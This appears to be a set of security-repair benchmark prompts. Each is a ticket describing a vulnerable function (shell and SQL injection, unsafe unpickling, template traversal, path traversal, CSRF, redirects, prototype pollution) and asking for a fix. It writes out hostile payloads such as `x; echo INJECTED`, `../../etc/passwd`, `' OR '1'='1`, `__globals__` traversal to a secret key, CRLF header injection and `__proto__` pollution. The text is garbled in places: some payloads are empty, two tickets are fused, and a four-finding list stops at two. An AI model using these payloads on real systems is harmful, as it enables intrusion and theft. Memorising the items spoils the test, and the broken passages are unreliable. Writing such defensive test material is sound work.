Our static analysis flagged `relabel` (CWE-78): `relabel` replaces text by building an `echo ... | sed 's/old/new/g'` pipeline with `shell=True`: quotes or `;` in the text or in the search/replacement strings break out of the command, and regex characters in the search string are interpreted instead of matched literally. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Our static analysis flagged `run_step / log_event` (CWE-78): `run_step` formats the tool name and both file names into a shell command line, and `log_event` appends to the log with `os.system('echo ... >> file')`: file names with `;`, `$(...)` or quotes execute commands, the log text is interpreted by the shell, and the tool name is not restricted to the two supported tools. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Our static analysis flagged `sign` (CWE-328): `sign` builds the signature as `sha256(secret + message)` although the docstring promises an HMAC: that construction is vulnerable to length extension (anyone holding one valid link can append data and compute the matching signature without knowing the secret), and `verify` raises on non-ASCII signatures. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Security ticket for the webhook receiver (CWE-294). Problem: `verify_webhook` takes a timestamp but neither signs it nor checks it against the clock, so a captured request can be replayed forever (or with a refreshed `X-Timestamp`), and the freshness guarantee the senders believe in does not exist. Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests.

We had an incident review for the encrypted notes store. Root cause: `encrypt` XORs every note with the same repeating SHA-256 block of the key: two notes encrypted under one key reveal `p1 xor p2` (two-time pad, one known note decrypts all others), the keystream repeats every 32 bytes, identical notes give identical blobs, and nothing authenticates the blob, so ciphertext can be edited bit by bit. Close the hole in `encrypt` and anything that shares the flaw in this repository; normal users must notice nothing.

We had an incident review for the online bank. Root cause: `/transfer` and `/close-account` act on plain GET requests, so any web page can move money or close an account just by embedding `` (cross-site request forgery; links also end up in logs, prefetchers and crawlers). Close the hole in `Bank.handle` and anything that shares the flaw in this repository; normal users must notice nothing.

Review comment on `post_settings`: The settings form can be submitted by any site the user visits: `post_settings` trusts the session cookie alone, so a hidden auto-submitting form on another page changes the victim's e-mail address (and from there the password-reset address): cross-site request forgery. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

PrefsApi.post_prefs is unsafe: `post_prefs` only rejects requests whose `Origin` is present *and* does not start with the site's origin: requests with no `Origin` header (and a foreign `Referer`) are accepted, and `https://app.example.com.evil.io` passes the prefix test, so other sites can change a logged-in user's preferences. fix it without breaking normal use, README.md says what normal is.

We had an incident review for the profile page. Root cause: `csrf_token` is `md5` of a constant and the numeric user id, so anyone who knows (or guesses) a victim's user id can compute their anti-CSRF token and forge requests; the token is also identical in every session of a user. Close the hole in `Portal.csrf_token` and anything that shares the flaw in this repository; normal users must notice nothing.

Review comment on `NotesApp.post`: The double-submit check compares the form field with the cookie, and `None == None`: a forged post that carries neither (or two empty values, or two values the attacker chose after planting a cookie from a sibling sub-domain) passes. The token is not tied to the session or signed, so the server cannot tell whether it ever issued it. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

Our static analysis flagged `sanitize` (CWE-79): `sanitize` removes tags and attributes with regular expressions: link targets are only filtered for the literal text `javascript:`, so ``, `` and `` all keep a working script link, and a stray `<` is passed through unescaped, so `` element; README.md specifies the exact output format.

Our static analysis flagged `check` (CWE-285): `check` lets requests through that the policy should refuse: the first matching rule wins (a broad allow listed before a deny beats it), anything that no rule mentions is allowed, `*` in a resource pattern crosses `/` and the resource is not normalised so `/docs/public/../secret/x` matches `/docs/public/*`, and a role hierarchy with a loop crashes the check. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input. README.md defines the exact semantics (deny by default, deny wins, role inheritance, segment-wise patterns, normalisation).

A penetration test of the e-mail link builder reported a vulnerability: `build` hands the path to `urljoin`, so `//evil.io/x` or `https://evil.io/` turn a store link into a link to another site and `../../admin` leaves the `/store/` prefix; query parameter names are not encoded (`a=1&admin` injects a parameter); and `is_ours`, used to vet `return_to` URLs, only checks that the host name ends with the store's host and that the path starts with `/store`, so `https://evilshop.example/store/x`, `javascript://shop.example/store/%0Aalert(1)` and `https://shop.example/store/../admin` all count as the store. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour. Fix both functions; README.md has the exact rules.

Review comment on `render`: `render` lets a template read more than data: `{{ user.delete }}` calls the method, `{{ user._api_token }}` prints a private attribute, `{{ user.__class__.__init__.__globals__.SECRET_KEY }}` walks from an application object to the module globals and prints the signing key, and a few nested `for` loops over big lists keep the worker busy for minutes or build gigabytes of text. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload. README.md says what a template may read and which limits apply; marketing staff must keep every documented feature.

Security ticket for the pricing sheet (CWE-95). Problem: `evaluate` runs formulas with `eval` and an empty `__builtins__`, which is not a sandbox: `().__class__.__bases__[0].__subclasses__()` reaches every class of the interpreter, methods of variables get called, string and list syntax is available, and `10**10**10` or a few hundred nested operators exhaust CPU and memory. Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests. README.md lists the exact language (allowed syntax, variables, limits); the evaluator must reject everything else with `EvalError`.

Our static analysis flagged `search` (CWE-89): `search` builds its SQL by gluing the user's tokens together: field names go into the statement as typed, numeric values are not checked (`priority>=(select(max(id))from(tickets))` runs a sub-select, `priority>=0)OR(1=1` breaks out of the condition), the `%` and `_` wildcards of `LIKE` are not escaped, and the grammar silently ignores `NOT` and parentheses and gets the precedence of `OR` wrong. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input. README.md gives the grammar and semantics; implement it as a real parser that emits parameterised SQL with allow-listed columns, and only ever raise QueryError.

We had an incident review for the session cookies. Root cause: `load_session` feeds the cookie payload to `pickle.loads`. The HMAC is the only barrier, so anybody who obtains the signing secret (a leaked config, a backup, an old developer laptop) gets remote code execution on every web worker with a single forged cookie; the signature is not a license to unpickle. Close the hole in `load_session` and anything that shares the flaw in this repository; normal users must notice nothing.

Our static analysis flagged `handle` (CWE-502): `handle` unpickles every message from the job queue; the queue is writable by several internal services and by a message-broker console that some staff can reach, so a crafted message executes arbitrary code in the worker (which holds the storage credentials). Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Our static analysis flagged `DiskCache.get` (CWE-502): `DiskCache.get` unpickles whatever file sits at the cache path; the cache directory is shared with other tools (and world-writable on some CI machines), so planting a crafted `<hash>.pkl` there gives code execution to the next program that reads that key. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Security ticket for the drawing editor (CWE-502). Problem: `loads` rebuilds objects from a `__class__` key by importing any module and instantiating any class named in the document, with attacker-chosen keyword arguments: a shared drawing file can construct arbitrary classes inside the editor process (the JSON equivalent of unsafe pickle). Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests.

Security ticket for the layout workers (CWE-502). Problem: `loads` is a bare `pickle.loads` on messages that arrive from less trusted components: a message can name any importable callable (`os.system`, `subprocess.Popen`, `builtins.eval`, `builtins.getattr`...) and the unpickler calls it. The messages legitimately carry `Point`, `Rect` and a few builtin types, so the format has to stay; the set of allowed classes does not. Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests.

A penetration test of the profile cards reported a vulnerability: `RenderCard` is built on `text/template`, which inserts values verbatim: a display name such as `"><script>alert(1)</script>` breaks out of the attribute and the element and runs in every visitor's browser. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

Label is unsafe: `Label` hands a shell the string `echo archiving ` plus the archive name: a name like `x; echo INJECTED` or `$(echo INJECTED)` runs extra commands, and names with quotes, `$` or `*` are mangled. fix it without breaking normal use, README.md says what normal is.

A penetration test of the login page reported a vulnerability: `Target` accepts anything that starts with `/`, so `//evil.io`, `/\evil.io` and `/	/evil.io` (browsers read them as links to another site) pass: the login page redirects victims to an attacker's site after they typed their real password. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

We had an incident review for the document server. Root cause: `NewHandler` joins the `file` query parameter onto the document root with `filepath.Join`, which normalises `../` away: `/?file=../../etc/passwd` (or a symlink inside the root) reads files anywhere the server can. Close the hole in `NewHandler` and anything that shares the flaw in this repository; normal users must notice nothing.

Extract is unsafe: `Extract` joins every entry name onto the destination with `filepath.Join`: an entry called `../../home/user/.bashrc` (zip slip) or `/etc/cron.d/x` is written outside the destination directory, entries are written before later ones are validated, and symlink entries are not refused. fix it without breaking normal use, README.md says what normal is.

Our static analysis flagged `Stats` (CWE-362): `Stats` is called from the request goroutines but guards its map with nothing: concurrent increments are lost, `Snapshot` races with writers, and Go's runtime kills the whole server with `fatal error: concurrent map writes` under load. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Our static analysis flagged `apply_security_headers` (CWE-693): `apply_security_headers` returns the headers as they are: responses go out without a content-type guard, framing protection, CSP, referrer or HSTS policy, and they advertise the server software (`Server`, `X-Powered-By`), which makes clickjacking, MIME sniffing attacks and downgrade attacks easy. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Review comment on `make_client_context`: `make_client_context` turns certificate verification and host name checking off and allows TLS 1.0: anybody on the network path can impersonate the partner's server, read the API keys sent to it and alter the responses (man-in-the-middle). Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

render_error is unsafe: `render_error` sends the exception message, the full traceback and the process environment (database URLs, API keys) to whoever triggered the error, `DEBUG` is on by default, and `secret_key()` silently falls back to the public default `dev-secret`, with which sessions can be forged. fix it without breaking normal use, README.md says what normal is.

sshd_config is unsafe: `sshd_config` allows root logins and password authentication (also with empty passwords), unlimited-ish guesses, X11 and TCP forwarding, never drops idle sessions, and offers CBC ciphers, MD5 MACs and the 1024-bit group1 key exchange. fix it without breaking normal use, README.md says what normal is.

Security ticket for the API gateway (CWE-942). Problem: `cors_headers` reflects whatever Origin the browser sends together with `Access-Control-Allow-Credentials: true` (and allows all methods and headers): any website a logged-in user visits can read authenticated API responses, `null` origins from sandboxed iframes included. Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests.

Our static analysis flagged `Dockerfile` (CWE-1188): the image runs as root from a floating `python:latest` base, bakes a database password and an API token into environment variables, downloads and pipes an unreviewed script into bash, and the compose file runs the container privileged, on the host network, with the Docker socket mounted: a bug in the app means the host is gone. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

A penetration test of the CI pipeline reported a vulnerability: the CI workflow uses `pull_request_target` to check out and run code of the pull request with a write-all token and the repository's secrets, interpolates the PR title and branch name into a shell command (script injection), pipes a downloaded script into bash, echoes a secret, and uses unpinned actions. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

We had an incident review for the reverse proxy. Root cause: the nginx configuration announces its version, serves the app over plain HTTP, offers TLS 1.0/1.1 and every cipher, lists directory contents under `/static`, has an `alias` without the matching trailing slash on its `location` (so `/static../secrets` walks out of the directory), allows unlimited request bodies and sends none of the security headers. Close the hole in `nginx.conf` and anything that shares the flaw in this repository; normal users must notice nothing.

Our static analysis flagged `redirect_response` (CWE-113): `redirect_response` pastes the location into the raw response; a location such as `/x\r\nSet-Cookie: admin=1` (or one with a blank line and a script) adds headers or a body to the response (HTTP response splitting), and locations come from request parameters. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

set_cookie_header is unsafe: `set_cookie_header` writes the cookie name and value into the header unchecked: a value like `x; Domain=evil.io` or `x; Path=/admin` adds attributes, and one with `\r\nSet-Cookie: admin=1` adds a second header, while names such as `a=b` or `na me` produce broken cookies. fix it without breaking normal use, README.md says what normal is.

content_disposition is unsafe: `content_disposition` pastes the user-chosen file name between quotes: a name with a quote closes the parameter (`a"; filename="evil.exe` rewrites the download name), one with a line break injects headers, and names with non-ASCII characters are sent in no standard-compliant form. fix it without breaking normal use, README.md says what normal is.

A penetration test of the password-reset e-mails reported a vulnerability: `reset_link` builds the link from the request's `Host` / `X-Forwarded-Host` header, which the sender controls: a forged `Host: evil.io` makes the victim receive a genuine reset e-mail whose link goes to the attacker's server, handing over the token (host header poisoning). Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

We had an incident review for the notification mailer. Root cause: `build_message` writes the subject, sender and recipients into the message as they are, so a subject such as `Hi\r\nBcc: attacker@evil.io` (typed into a contact form) adds recipients or header lines, and a blank line in it replaces the body with attacker text (e-mail header injection). Close the hole in `build_message` and anything that shares the flaw in this repository; normal users must notice nothing.

A penetration test of the customer portal reported 4 findings in the code under `svc/` (every subdirectory is an independent component with its own `README.md` that says what it is supposed to do; there are tests for the normal behaviour and for hostile input). Fix all of them in the code: the whole class of each problem, not just the example payloads, with every documented behaviour for legitimate input kept, odd-looking but valid input included. Do not touch the tests.

1. `svc/duplicate_accounts/registry.py` (the sign-up service): `register` asks the store whether the name exists and then inserts it, as two separate calls: two sign-ups for the same name that interleave both pass the check, both insert, and the second silently overwrites the first account's e-mail address, which hands the account (and its password resets) to the second requester.
2. `svc/format_template/mailtemplate.py` (the e-mail templates): `render_email` hands customer-written templates to `str.format` together with a `User` object: a template containing `{user.__class__.__init__.__globals__[SECRET_KEY]}` (attribute and index traversal) prints the application's signing key into the e-mail, and `{name.__class__}` style fields expose internals.
3. `svc/otp_attempts/otp_service.py` (the step-up authentication): `verify` has no attempt counter and codes can be requested without limit: a six-digit code falls to brute force in a few hundred thousand guesses (or far fewer, because every new code resets the search), and a correct code can be replayed until it expires.
4. `svc/theme_upload/unpacker.py` (the theme gallery): `extract_zip` joins every member name of an uploaded archive to the destination folder and writes it, so a member called `../../app/settings.py` (or an absolute path) is written outside the folder (zip-slip).

A penetration test of the partner API reported 4 findings in the code under `svc/` (every subdirectory is an independent component with its own `README.md` that says what it is supposed to do; there are tests for the normal behaviour and for hostile input). Fix all of them in the code: the whole class of each problem, not just the example payloads, with every documented behaviour for legitimate input kept, odd-looking but valid input included. Do not touch the tests.

1. `svc/id_list/bulk.py` (the bulk export): `get_users` joins the ids it is given into an `IN (...)` list as text; ids come from a query string, so one element such as `2) OR (1=1` returns the whole table, and an empty list produces invalid SQL on some databases.
2. `svc/queue_jobs/worker.py` (the background worker): `handle` unpickles every message from the job queue; the queue is writable by several internal services and by a message-broker console that some staff can reach, so a crafted message executes arbitrary code in the worker (which holds the storage credentials).

Security ticket for the profile endpoint (CWE-915). Problem: `updateProfile` copies every field of the request body onto the user object with `Object.assign`: a body with `isAdmin: true` escalates privileges, and a JSON body with a `__proto__` key replaces the user's prototype so inherited flags such as `isAdmin` appear out of nowhere. We had an incident review for the archive tool. Root cause: `archiveLabel` builds a shell command line from the archive name (`echo archiving <name>`) and runs it with `exec`: a name such as `x; echo INJECTED` or `$(echo INJECTED)` runs extra commands, and names with quotes or `$` are mangled. Close the hole in `archiveLabel` and anything that shares the flaw in this repository; normal users must notice nothing.

A penetration test of the user search API reported a vulnerability: `findUserQuery` and `listUsersQuery` paste the search term and the sort column into the SQL text (`WHERE name = '<name>'`, `ORDER BY <column>`), so `' OR '1'='1` returns every user and `name; DROP TABLE users` is a stacked statement waiting for a driver that allows it. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

isAllowedTarget is unsafe: `isAllowedTarget` checks the text of the URL with `startsWith('https://hooks.partner.example')`, so `https://hooks.partner.example.evil.io/`, `https://hooks.partner.example@evil.io/` and `https://hooks.partner.example:8443/` are accepted and the sender posts to hosts nobody approved. fix it without breaking normal use, README.md says what normal is.

readUpload is unsafe: `readUpload` joins the requested name onto the upload directory with `path.join`, which happily normalises `../` out of the directory: `GET /files?name=../../etc/passwd` (or an absolute path, or a symlink that was uploaded) reads files anywhere the server can. fix it without breaking normal use, README.md says what normal is.

Review comment on `filterItems`: `filterItems` turns the search box content into a regular expression: `(` or `[` makes the request throw, `.` and `*` match more than the user typed, and a query like `(a+)+$` against a long item name makes the single-threaded server spin in catastrophic backtracking. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

Our static analysis flagged `verifyToken` (CWE-347): `verifyToken` reads the algorithm from the token header and treats `alg: none` as "nothing to verify": a token with any claims and an empty signature is accepted, and other `alg` values are verified as HS256 without question. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Review comment on `deepMerge`: `deepMerge` recurses into whatever keys the source has: merging a JSON body such as `{"__proto__": {"isAdmin": true}}` writes `isAdmin` into `Object.prototype`, so every object in the process suddenly has it (prototype pollution). Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

Our static analysis flagged `setPath` (CWE-1321): `setPath(obj, 'a.b.c', value)` walks the dotted path from user-chosen form field names (`user.address.city`) and creates what is missing; a field named `__proto__.isAdmin` walks into `Object.prototype` and sets the flag on every object of the process.
